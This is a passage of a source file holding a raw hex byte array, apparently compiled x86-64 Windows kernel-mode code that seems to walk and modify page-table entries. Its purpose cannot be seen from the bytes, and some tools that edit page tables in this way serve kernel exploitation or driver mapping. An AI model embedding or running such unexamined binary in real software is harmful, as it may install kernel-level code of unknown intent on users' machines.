    0x48, 0x81, 0xC6, 0x00, 0x02, 0x00, 0x00, 0x41, 0xFF, 0xC4, 0x48, 0x39, 0xDE, 0x73, 0x51, 0x8B,
    0x4F, 0x20, 0x44, 0x01, 0xE1, 0x48, 0xC7, 0x44, 0x24, 0x40, 0x00, 0x00, 0x00, 0x00, 0xC1, 0xE1,
    0x03, 0x48, 0x03, 0x4F, 0x30, 0x41, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x48, 0x89, 0xEA, 0x41, 0xB1,
    0x01, 0xE8, 0xAA, 0x38, 0x00, 0x00, 0x85, 0xC0, 0x78, 0xC6, 0x48, 0x8B, 0x44, 0x24, 0x40, 0xA8,
    0x01, 0x74, 0xBD, 0x48, 0xB9, 0x00, 0xF0, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x48, 0x21, 0xC8,
    0x4C, 0x39, 0xF0, 0x75, 0xAB, 0x31, 0xC9, 0xE9, 0x54, 0xFF, 0xFF, 0xFF, 0x0F, 0x1F, 0x40, 0x00,
    0x31, 0xC9, 0x45, 0x84, 0xED, 0x0F, 0x85, 0x45, 0xFF, 0xFF, 0xFF, 0x48, 0xB8, 0x00, 0xF0, 0xFF,
    0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x49, 0x21, 0xC6, 0x49, 0x81, 0xCE, 0x03, 0x01, 0x00, 0x00, 0x4C,
    0x89, 0x74, 0x24, 0x40, 0x41, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x48,
    0x89, 0xEA, 0x41, 0xB1, 0x01, 0xE8, 0x76, 0x39, 0x00, 0x00, 0xB9, 0x06, 0x00, 0x00, 0x00, 0x85,
    0xC0, 0x0F, 0x89, 0x09, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x44, 0x24, 0x48, 0x89, 0x44, 0x24, 0x20,
    0x48, 0x8D, 0x0D, 0x8E, 0x83, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xC0, 0x88, 0x00, 0x00, 0x4C, 0x8D,
    0x05, 0x07, 0x70, 0x00, 0x00, 0x4C, 0x8B, 0x4C, 0x24, 0x28, 0xFF, 0x15, 0x88, 0x9D, 0x00, 0x00,
    0xB9, 0x01, 0x00, 0x00, 0x00, 0xE9, 0xD6, 0xFE, 0xFF, 0xFF, 0x66, 0x0F, 0x1F, 0x44, 0x00, 0x00,
    0x83, 0xF9, 0x06, 0x0F, 0x85, 0x83, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0x48, 0xFF,
    0xC1, 0x48, 0x39, 0xD9, 0x41, 0x0F, 0x93, 0xC6, 0x48, 0x3B, 0x4C, 0x24, 0x50, 0x0F, 0x85, 0x8F,
    0xFD, 0xFF, 0xFF, 0xE9, 0x3C, 0xFD, 0xFF, 0xFF, 0x48, 0x8D, 0x0D, 0x5E, 0x83, 0x00, 0x00, 0x48,
    0x8D, 0x15, 0x68, 0x88, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xAF, 0x6F, 0x00, 0x00, 0x4C, 0x8B, 0x4C,
    0x24, 0x28, 0xFF, 0x15, 0x30, 0x9D, 0x00, 0x00, 0xEB, 0x42, 0x48, 0x8D, 0x0D, 0x8E, 0x83, 0x00,
    0x00, 0x48, 0x8D, 0x15, 0x46, 0x88, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x8D, 0x6F, 0x00, 0x00, 0x4C,
    0x8B, 0x4C, 0x24, 0x28, 0xFF, 0x15, 0x0E, 0x9D, 0x00, 0x00, 0xEB, 0x25, 0x4C, 0x89, 0x6C, 0x24,
    0x20, 0x48, 0x8D, 0x0D, 0x39, 0x60, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x1F, 0x88, 0x00, 0x00, 0x4C,
    0x8D, 0x05, 0x66, 0x6F, 0x00, 0x00, 0x41, 0x89, 0xF1, 0x41, 0xFF, 0xD2, 0x4C, 0x8B, 0x74, 0x24,
    0x38, 0x41, 0x80, 0xE6, 0x01, 0x44, 0x89, 0xF0, 0x48, 0x83, 0xC4, 0x68, 0x5B, 0x5D, 0x5F, 0x5E,
    0x41, 0x5C, 0x41, 0x5D, 0x41, 0x5E, 0x41, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x56, 0x57, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x83, 0x3D, 0x69, 0x47, 0x04, 0x00, 0x00, 0x0F,
    0x84, 0x85, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x35, 0xCC, 0x9B, 0x00, 0x00, 0x48, 0x2B, 0x35, 0x45,
    0x47, 0x04, 0x00, 0x48, 0x8D, 0x0D, 0xCB, 0x61, 0x00, 0x00, 0x48, 0x8D, 0x3D, 0xC3, 0x87, 0x00,
    0x00, 0x48, 0x8D, 0x1D, 0x28, 0x7C, 0x00, 0x00, 0x48, 0x89, 0xFA, 0x49, 0x89, 0xD8, 0x49, 0x89,
    0xF1, 0xFF, 0x15, 0x81, 0x9C, 0x00, 0x00, 0x48, 0x03, 0x35, 0x2A, 0x47, 0x04, 0x00, 0x48, 0x8D,
    0x0D, 0x80, 0x62, 0x00, 0x00, 0x48, 0x89, 0xFA, 0x49, 0x89, 0xD8, 0x49, 0x89, 0xF1, 0xFF, 0x15,
    0x64, 0x9C, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0xF5, 0x9C, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x2E, 0xF5,
    0xFF, 0xFF, 0x4C, 0x8D, 0x0D, 0x47, 0x47, 0x04, 0x00, 0x48, 0x89, 0xF2, 0xE8, 0x5F, 0x40, 0x00,
    0x00, 0x84, 0xC0, 0x74, 0x1E, 0x48, 0x8B, 0x0D, 0xEC, 0x46, 0x04, 0x00, 0xE8, 0x8F, 0x2D, 0x00,
    0x00, 0xE8, 0x6A, 0x2D, 0x00, 0x00, 0x31, 0xC0, 0xEB, 0x29, 0x48, 0x8D, 0x0D, 0xE4, 0x68, 0x00,
    0x00, 0xEB, 0x07, 0x48, 0x8D, 0x0D, 0xD1, 0x76, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x3D, 0x87, 0x00,
    0x00, 0x4C, 0x8D, 0x05, 0xA8, 0x7B, 0x00, 0x00, 0xFF, 0x15, 0x0A, 0x9C, 0x00, 0x00, 0xB8, 0x01,
    0x00, 0x00, 0xC0, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0x5F, 0x5E, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x56, 0x57, 0x53, 0x48, 0x83, 0xEC, 0x30, 0x80, 0x3D, 0x92, 0x9C, 0x00, 0x00, 0x00, 0x0F, 0x84,
    0x90, 0x01, 0x00, 0x00, 0x48, 0xC7, 0x05, 0xC9, 0x46, 0x04, 0x00, 0x00, 0x28, 0x00, 0x00, 0xB9,
    0x00, 0x40, 0x01, 0x00, 0xE8, 0xF7, 0x15, 0x00, 0x00, 0x48, 0x89, 0x05, 0xA8, 0x46, 0x04, 0x00,
    0x48, 0x85, 0xC0, 0x0F, 0x84, 0x82, 0x01, 0x00, 0x00, 0xC7, 0x05, 0x9D, 0x46, 0x04, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x4C, 0x8B, 0x05, 0x9E, 0x46, 0x04, 0x00, 0x49, 0xC1, 0xE0, 0x03, 0x48, 0x89,
    0xC1, 0x31, 0xD2, 0xFF, 0x15, 0xAF, 0x9B, 0x00, 0x00, 0x4C, 0x8B, 0x0D, 0x88, 0x46, 0x04, 0x00,
    0x48, 0x8D, 0x0D, 0x28, 0x64, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xB6, 0x86, 0x00, 0x00, 0x4C, 0x8D,
    0x05, 0x25, 0x77, 0x00, 0x00, 0xFF, 0x15, 0x7D, 0x9B, 0x00, 0x00, 0x48, 0x8B, 0x3D, 0x0E, 0x9A,
    0x00, 0x00, 0x48, 0x85, 0xFF, 0x0F, 0x84, 0x50, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x1F, 0x48, 0x39,
    0xFB, 0x0F, 0x84, 0x3B, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x35, 0xEC, 0x90, 0x00, 0x00, 0xEB, 0x0C,
    0x48, 0x8B, 0x1B, 0x48, 0x39, 0xFB, 0x0F, 0x84, 0x26, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x4B, 0x60,
    0x48, 0x85, 0xC9, 0x74, 0xEB, 0x48, 0x89, 0xF2, 0xFF, 0x15, 0x6A, 0x9B, 0x00, 0x00, 0x85, 0xC0,
    0x75, 0xDE, 0x4C, 0x8B, 0x4B, 0x30, 0x4C, 0x89, 0x0D, 0xCB, 0x45, 0x04, 0x00, 0x48, 0x8D, 0x35,
    0xC4, 0x45, 0x04, 0x00, 0x8B, 0x43, 0x40, 0x48, 0x89, 0x05, 0xC2, 0x45, 0x04, 0x00, 0x48, 0x89,
    0x44, 0x24, 0x20, 0x48, 0x8D, 0x0D, 0xDF, 0x5E, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x25, 0x86, 0x00,
    0x00, 0x4C, 0x8D, 0x05, 0x55, 0x72, 0x00, 0x00, 0xFF, 0x15, 0xFA, 0x9A, 0x00, 0x00, 0x48, 0x8B,
    0x05, 0x93, 0x45, 0x04, 0x00, 0x48, 0x89, 0x05, 0x9C, 0x45, 0x04, 0x00, 0x48, 0x8B, 0x0D, 0x7D,
    0x9B, 0x00, 0x00, 0x48, 0x89, 0xF2, 0xE8, 0x35, 0xF8, 0xFF, 0xFF, 0x84, 0xC0, 0x0F, 0x84, 0xE0,
    0x00, 0x00, 0x00, 0x48, 0x8B, 0x15, 0x76, 0x45, 0x04, 0x00, 0x48, 0x8B, 0x0D, 0x67, 0x45, 0x04,
    0x00, 0xE8, 0x1A, 0xF5, 0xFF, 0xFF, 0x84, 0xC0, 0x0F, 0x84, 0xCE, 0x00, 0x00, 0x00, 0x48, 0x8D,
    0x0D, 0x53, 0x45, 0x04, 0x00, 0xE8, 0x46, 0xFA, 0xFF, 0xFF, 0x4C, 0x8B, 0x15, 0xA7, 0x9A, 0x00,
    0x00, 0x84, 0xC0, 0x0F, 0x84, 0xBC, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0x0D, 0x48, 0x45, 0x04, 0x00,
    0x48, 0x8D, 0x0D, 0xDA, 0x58, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xA8, 0x85, 0x00, 0x00, 0x4C, 0x8D,
    0x05, 0x39, 0x74, 0x00, 0x00, 0x41, 0xFF, 0xD2, 0xE8, 0xB3, 0xFD, 0xFF, 0xFF, 0x41, 0x89, 0xC1,
    0x31, 0xC0, 0x45, 0x85, 0xC9, 0x79, 0x74, 0x48, 0x8D, 0x0D, 0x84, 0x62, 0x00, 0x00, 0x48, 0x8D,
    0x15, 0x9F, 0x85, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x12, 0x74, 0x00, 0x00, 0xFF, 0x15, 0x56, 0x9A,
    0x00, 0x00, 0xEB, 0x52, 0x48, 0x8D, 0x0D, 0xFA, 0x7B, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x6C, 0x85,
    0x00, 0x00, 0x4C, 0x8D, 0x05, 0xF5, 0x73, 0x00, 0x00, 0xEB, 0x35, 0x48, 0x8D, 0x0D, 0x30, 0x57,
    0x00, 0x00, 0x48, 0x8D, 0x15, 0x55, 0x85, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xCA, 0x75, 0x00, 0x00,
    0xEB, 0x1E, 0x48, 0x8D, 0x0D, 0x9D, 0x65, 0x00, 0x00, 0xEB, 0x07, 0x48, 0x8D, 0x0D, 0x4B, 0x7B,
    0x00, 0x00, 0x48, 0x8D, 0x15, 0x35, 0x85, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x5D, 0x71, 0x00, 0x00,
    0xFF, 0x15, 0x02, 0x9A, 0x00, 0x00, 0xB8, 0x01, 0x00, 0x00, 0xC0, 0x48, 0x83, 0xC4, 0x30, 0x5B,
    0x5F, 0x5E, 0xC3, 0x48, 0x8D, 0x0D, 0x70, 0x6B, 0x00, 0x00, 0xEB, 0x9F, 0x48, 0x8D, 0x0D, 0xC4,
    0x6C, 0x00, 0x00, 0xEB, 0x96, 0x48, 0x8D, 0x0D, 0xE5, 0x6C, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xFB,
    0x84, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x84, 0x73, 0x00, 0x00, 0x41, 0xFF, 0xD2, 0xEB, 0xC7, 0xCC,
    0x48, 0x83, 0xEC, 0x28, 0x48, 0x8B, 0x05, 0x7D, 0x9A, 0x00, 0x00, 0x48, 0x8D, 0x14, 0x08, 0x48,
    0x89, 0x54, 0x08, 0x08, 0x48, 0x89, 0x14, 0x08, 0x48, 0x8B, 0x05, 0x71, 0x9A, 0x00, 0x00, 0x48,
    0x8D, 0x14, 0x08, 0x48, 0x89, 0x54, 0x08, 0x08, 0x48, 0x89, 0x14, 0x08, 0x48, 0x8B, 0x05, 0x75,
    0x9A, 0x00, 0x00, 0x31, 0xD2, 0x45, 0x31, 0xC0, 0x4C, 0x87, 0x04, 0x08, 0x45, 0x31, 0xC0, 0x4C,
    0x87, 0x04, 0x08, 0x48, 0x8B, 0x05, 0x66, 0x9A, 0x00, 0x00, 0x48, 0x87, 0x94, 0x01, 0xE8, 0x00,
    0x00, 0x00, 0x48, 0x8B, 0x05, 0x5F, 0x9A, 0x00, 0x00, 0xF0, 0x83, 0x0C, 0x08, 0x10, 0x48, 0x8B,
    0x05, 0xDB, 0x99, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0x4C, 0x9A, 0x00, 0x00, 0xF0, 0x83, 0x0C, 0x01,
    0x10, 0x0F, 0xAE, 0xF0, 0x48, 0x8D, 0x0D, 0x33, 0x84, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x72, 0x84,
    0x00, 0x00, 0x4C, 0x8D, 0x05, 0x98, 0x66, 0x00, 0x00, 0xFF, 0x15, 0x39, 0x99, 0x00, 0x00, 0x90,
    0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x41, 0x57, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x56, 0x57, 0x55, 0x53, 0x48, 0x83, 0xEC, 0x48,
    0x4C, 0x89, 0xCB, 0x4C, 0x89, 0xC7, 0x49, 0x89, 0xD6, 0x49, 0x89, 0xCF, 0xB9, 0x00, 0x10, 0x00,
    0x00, 0xE8, 0x2A, 0x13, 0x00, 0x00, 0x48, 0x89, 0xC6, 0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x10,
    0x00, 0x00, 0x48, 0x8D, 0x0D, 0x60, 0x5D, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x19, 0x84, 0x00, 0x00,
    0x4C, 0x8D, 0x05, 0xA9, 0x54, 0x00, 0x00, 0x49, 0x89, 0xC1, 0xFF, 0x15, 0xD8, 0x98, 0x00, 0x00,
    0x48, 0x85, 0xF6, 0x0F, 0x84, 0xB0, 0x01, 0x00, 0x00, 0x4C, 0x89, 0x7C, 0x24, 0x40, 0x48, 0x89,
    0x7C, 0x24, 0x38, 0x4D, 0x89, 0xF5, 0x49, 0xC1, 0xED, 0x0C, 0x48, 0x8D, 0x0D, 0x99, 0x89, 0x00,
    0x00, 0x48, 0x8D, 0x15, 0xDC, 0x83, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x8B, 0x53, 0x00, 0x00, 0x4D,
    0x89, 0xE9, 0xFF, 0x15, 0xA0, 0x98, 0x00, 0x00, 0x48, 0x8D, 0x6C, 0x24, 0x30, 0x4D, 0x89, 0xF7,
    0x45, 0x31, 0xE4, 0xEB, 0x1B, 0x66, 0x66, 0x2E, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x49, 0xFF, 0xC4, 0x49, 0x83, 0xC7, 0x08, 0x49, 0x81, 0xFC, 0x00, 0x02, 0x00, 0x00, 0x74, 0x67,
    0x48, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00, 0x41, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x4C,
    0x89, 0xF9, 0x48, 0x89, 0xEA, 0x45, 0x31, 0xC9, 0xE8, 0xE3, 0x32, 0x00, 0x00, 0x85, 0xC0, 0x78,
    0xCF, 0x48, 0x8B, 0x7C, 0x24, 0x30, 0x40, 0xF6, 0xC7, 0x01, 0x74, 0xC4, 0x48, 0x89, 0xF8, 0x48,
    0xC1, 0xE8, 0x0C, 0x48, 0xB9, 0xFF, 0xFF, 0xFF, 0xFF, 0x0F, 0x00, 0x00, 0x00, 0x48, 0x21, 0xC8,
    0x4C, 0x39, 0xE8, 0x75, 0xAB, 0x48, 0x8D, 0x0D, 0x30, 0x62, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x43,
    0x83, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x00, 0x53, 0x00, 0x00, 0x45, 0x89, 0xE1, 0xFF, 0x15, 0x15,
    0x98, 0x00, 0x00, 0xB0, 0x01, 0xEB, 0x22, 0x48, 0x8D, 0x0D, 0xF4, 0x85, 0x00, 0x00, 0x48, 0x8D,
    0x15, 0x3F, 0x83, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xDE, 0x52, 0x00, 0x00, 0xFF, 0x15, 0xF6, 0x97,
    0x00, 0x00, 0x31, 0xFF, 0x31, 0xC0, 0x45, 0x31, 0xE4, 0x44, 0x89, 0x23, 0x88, 0x43, 0x04, 0x66,
    0xC7, 0x43, 0x05, 0x00, 0x00, 0xC6, 0x43, 0x07, 0x00, 0x48, 0x89, 0x7B, 0x08, 0x41, 0xB8, 0x00,
    0x10, 0x00, 0x00, 0x4C, 0x89, 0xF1, 0x48, 0x89, 0xF2, 0x45, 0x31, 0xC9, 0xE8, 0x4F, 0x32, 0x00,
    0x00, 0x85, 0xC0, 0x40, 0x0F, 0x99, 0xC5, 0x0F, 0x88, 0xBB, 0x00, 0x00, 0x00, 0x41, 0xB8, 0x00,
    0x10, 0x00, 0x00, 0x48, 0x8B, 0x7C, 0x24, 0x40, 0x48, 0x89, 0xF9, 0x48, 0x89, 0xF2, 0xFF, 0x15,
    0xAC, 0x97, 0x00, 0x00, 0x80, 0x7B, 0x04, 0x00, 0x0F, 0x84, 0xB1, 0x00, 0x00, 0x00, 0x44, 0x8B,
    0x33, 0x4A, 0x8D, 0x0C, 0xF7, 0x48, 0xB8, 0xFF, 0x0F, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x48,
    0x23, 0x43, 0x08, 0x48, 0xBA, 0x00, 0xF0, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x4C, 0x8B, 0x44,
    0x24, 0x38, 0x49, 0x21, 0xD0, 0x49, 0x09, 0xC0, 0x4C, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8D, 0x54,
    0x24, 0x30, 0x41, 0xB8, 0x08, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x62, 0x97, 0x00, 0x00, 0x48, 0x8B,
    0x44, 0x24, 0x30, 0x48, 0xC1, 0xE8, 0x0C, 0x48, 0xB9, 0xFF, 0xFF, 0xFF, 0xFF, 0x0F, 0x00, 0x00,
    0x00, 0x48, 0x21, 0xC8, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0x8D, 0x0D, 0xBF, 0x87, 0x00, 0x00,
    0x48, 0x8D, 0x15, 0x4F, 0x82, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xE9, 0x51, 0x00, 0x00, 0x45, 0x89,
    0xF1, 0xFF, 0x15, 0x21, 0x97, 0x00, 0x00, 0xEB, 0x51, 0x48, 0x8D, 0x0D, 0x2D, 0x53, 0x00, 0x00,
    0x48, 0x8D, 0x15, 0x37, 0x82, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x9E, 0x51, 0x00, 0x00, 0xFF, 0x15,
    0x04, 0x97, 0x00, 0x00, 0x31, 0xED, 0xEB, 0x67, 0x48, 0x8D, 0x0D, 0x10, 0x84, 0x00, 0x00, 0x48,
    0x8D, 0x15, 0x18, 0x82, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x7F, 0x51, 0x00, 0x00, 0xEB, 0x15, 0x48,
    0x8D, 0x0D, 0x8F, 0x84, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x07, 0x82, 0x00, 0x00, 0x4C, 0x8D, 0x05,
    0x93, 0x51, 0x00, 0x00, 0xFF, 0x15, 0xCE, 0x96, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x20, 0x00,
    0x10, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0xF9, 0x5A, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xE8, 0x81, 0x00,
    0x00, 0x4C, 0x8D, 0x05, 0x77, 0x52, 0x00, 0x00, 0x49, 0x89, 0xF1, 0xFF, 0x15, 0xA7, 0x96, 0x00,
    0x00, 0xBA, 0x00, 0x10, 0x00, 0x00, 0x48, 0x89, 0xF1, 0xFF, 0x15, 0x59, 0x94, 0x00, 0x00, 0x89,
    0xE8, 0x48, 0x83, 0xC4, 0x48, 0x5B, 0x5D, 0x5F, 0x5E, 0x41, 0x5C, 0x41, 0x5D, 0x41, 0x5E, 0x41,
    0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x56, 0x57, 0x53, 0x48, 0x83, 0xEC, 0x40, 0x48, 0x85, 0xD2, 0x74, 0x28, 0x48, 0x89, 0xD6, 0x89,
    0xCF, 0x48, 0xC7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x00, 0x89, 0xC9, 0x48, 0x8D, 0x54, 0x24,
    0x28, 0xFF, 0x15, 0x19, 0x95, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x33, 0x48, 0x8D, 0x0D, 0x2F, 0x76,
    0x00, 0x00, 0xEB, 0x07, 0x48, 0x8D, 0x0D, 0x56, 0x61, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x5C, 0x81,
    0x00, 0x00, 0x4C, 0x8D, 0x05, 0xD1, 0x60, 0x00, 0x00, 0xFF, 0x15, 0x29, 0x96, 0x00, 0x00, 0xBE,
    0x01, 0x00, 0x00, 0xC0, 0x89, 0xF0, 0x48, 0x83, 0xC4, 0x40, 0x5B, 0x5F, 0x5E, 0xC3, 0x48, 0x8B,
    0x5C, 0x24, 0x28, 0x48, 0x85, 0xDB, 0x74, 0x2E, 0x48, 0x89, 0x5C, 0x24, 0x20, 0x48, 0x8D, 0x0D,
    0x25, 0x6D, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x2E, 0x81, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xDA, 0x71,
    0x00, 0x00, 0x4C, 0x8D, 0x0D, 0x04, 0x81, 0x00, 0x00, 0xFF, 0x15, 0xE9, 0x95, 0x00, 0x00, 0x48,
    0x8B, 0x4C, 0x24, 0x28, 0xEB, 0x02, 0x31, 0xC9, 0x48, 0x89, 0x0E, 0xE8, 0x10, 0x34, 0x00, 0x00,
    0x48, 0x89, 0x46, 0x28, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x6C, 0x01, 0x00, 0x00, 0x48, 0x85, 0xDB,
    0x74, 0x2B, 0x48, 0x89, 0x5C, 0x24, 0x20, 0x48, 0x8D, 0x0D, 0x41, 0x6C, 0x00, 0x00, 0x48, 0x8D,
    0x15, 0xE4, 0x80, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xE3, 0x71, 0x00, 0x00, 0x4C, 0x8D, 0x0D, 0xBA,
    0x80, 0x00, 0x00, 0xFF, 0x15, 0x9F, 0x95, 0x00, 0x00, 0x48, 0x8B, 0x46, 0x28, 0x48, 0x8D, 0x0D,
    0xDA, 0x5C, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xB9, 0x80, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x28, 0x60,
    0x00, 0x00, 0x49, 0x89, 0xC1, 0xFF, 0x15, 0x7D, 0x95, 0x00, 0x00, 0xB9, 0x00, 0x10, 0x00, 0x00,
    0xE8, 0x9B, 0x0F, 0x00, 0x00, 0x48, 0x89, 0x46, 0x18, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x65, 0x01,
    0x00, 0x00, 0x48, 0x89, 0xC1, 0xE8, 0xF6, 0x26, 0x00, 0x00, 0x48, 0x89, 0x46, 0x20, 0x4C, 0x8B,
    0x15, 0x53, 0x95, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x52, 0x01, 0x00, 0x00, 0x4C, 0x8B,
    0x4E, 0x18, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0x8D, 0x0D, 0xA5, 0x5C, 0x00, 0x00, 0x48, 0x8D,
    0x15, 0x5F, 0x80, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xCE, 0x5F, 0x00, 0x00, 0x41, 0xFF, 0xD2, 0x48,
    0x8B, 0x4E, 0x18, 0x4C, 0x8B, 0x46, 0x20, 0x48, 0x8B, 0x56, 0x28, 0x4C, 0x8D, 0x4C, 0x24, 0x30,
    0xE8, 0xEB, 0xFB, 0xFF, 0xFF, 0x84, 0xC0, 0x0F, 0x84, 0x2D, 0x01, 0x00, 0x00, 0x8B, 0x44, 0x24,
    0x30, 0x89, 0x46, 0x34, 0x0F, 0xB6, 0x44, 0x24, 0x34, 0x88, 0x46, 0x31, 0x84, 0xC0, 0x48, 0x8D,
    0x05, 0x45, 0x6C, 0x00, 0x00, 0x4C, 0x8D, 0x0D, 0x1F, 0x77, 0x00, 0x00, 0x4C, 0x0F, 0x44, 0xC8,
    0x48, 0x8D, 0x0D, 0xE2, 0x4F, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xF8, 0x7F, 0x00, 0x00, 0x4C, 0x8D,
    0x05, 0x75, 0x5F, 0x00, 0x00, 0xFF, 0x15, 0xCD, 0x94, 0x00, 0x00, 0xB9, 0x00, 0x10, 0x00, 0x00,
    0xE8, 0xEB, 0x0E, 0x00, 0x00, 0x48, 0x89, 0x46, 0x08, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0xE1, 0x00,
    0x00, 0x00, 0x48, 0x8B, 0x1E, 0x48, 0x89, 0xDA, 0x48, 0x81, 0xE2, 0x00, 0xF0, 0xFF, 0xFF, 0x81,
    0xE3, 0xFF, 0x0F, 0x00, 0x00, 0x41, 0xB8, 0x00, 0x10, 0x00, 0x00, 0x48, 0x89, 0xC1, 0xFF, 0x15,
    0x9C, 0x94, 0x00, 0x00, 0x48, 0x03, 0x5E, 0x08, 0x48, 0x89, 0x5E, 0x10, 0x48, 0x89, 0xD9, 0xE8,
    0xBC, 0xFA, 0xFF, 0xFF, 0x48, 0x8B, 0x05, 0x8D, 0x8D, 0x00, 0x00, 0x48, 0x8B, 0x4E, 0x10, 0x48,
    0x8B, 0x56, 0x20, 0x48, 0x89, 0x14, 0x08, 0x89, 0x7E, 0x38, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x87,
    0x46, 0x30, 0x31, 0xF6, 0xE9, 0x3B, 0xFE, 0xFF, 0xFF, 0x48, 0x8D, 0x0D, 0xA7, 0x70, 0x00, 0x00,
    0x48, 0x8D, 0x15, 0x77, 0x7F, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xEC, 0x5E, 0x00, 0x00, 0xFF, 0x15,
    0x44, 0x94, 0x00, 0x00, 0xBE, 0x01, 0x00, 0x00, 0xC0, 0x48, 0x85, 0xDB, 0x0F, 0x84, 0x12, 0xFE,
    0xFF, 0xFF, 0x48, 0x89, 0x5C, 0x24, 0x20, 0x48, 0x8D, 0x0D, 0x15, 0x6B, 0x00, 0x00, 0x48, 0x8D,
    0x15, 0x54, 0x7F, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xFF, 0x6F, 0x00, 0x00, 0x4C, 0x8D, 0x0D, 0x2A,
    0x7F, 0x00, 0x00, 0xFF, 0x15, 0x0F, 0x94, 0x00, 0x00, 0x48, 0x89, 0xD9, 0xFF, 0x15, 0x1E, 0x93,
    0x00, 0x00, 0xE9, 0xDD, 0xFD, 0xFF, 0xFF, 0x48, 0x8D, 0x0D, 0x78, 0x81, 0x00, 0x00, 0xEB, 0x2A,
    0x48, 0x8D, 0x0D, 0x31, 0x81, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x10, 0x7F, 0x00, 0x00, 0x4C, 0x8D,
    0x05, 0x85, 0x5E, 0x00, 0x00, 0x41, 0xFF, 0xD2, 0xEB, 0x24, 0x48, 0x8D, 0x0D, 0x19, 0x4F, 0x00,
    0x00, 0xEB, 0x07, 0x48, 0x8D, 0x0D, 0x5A, 0x7E, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xED, 0x7E, 0x00,
    0x00, 0x4C, 0x8D, 0x05, 0x62, 0x5E, 0x00, 0x00, 0xFF, 0x15, 0xBA, 0x93, 0x00, 0x00, 0x48, 0x8B,
    0x4C, 0x24, 0x28, 0xFF, 0x15, 0xC7, 0x92, 0x00, 0x00, 0xE9, 0x81, 0xFD, 0xFF, 0xFF, 0xCC, 0xCC,
    0x41, 0x57, 0x41, 0x56, 0x56, 0x57, 0x55, 0x53, 0x48, 0x83, 0xEC, 0x48, 0x44, 0x89, 0xC6, 0x89,
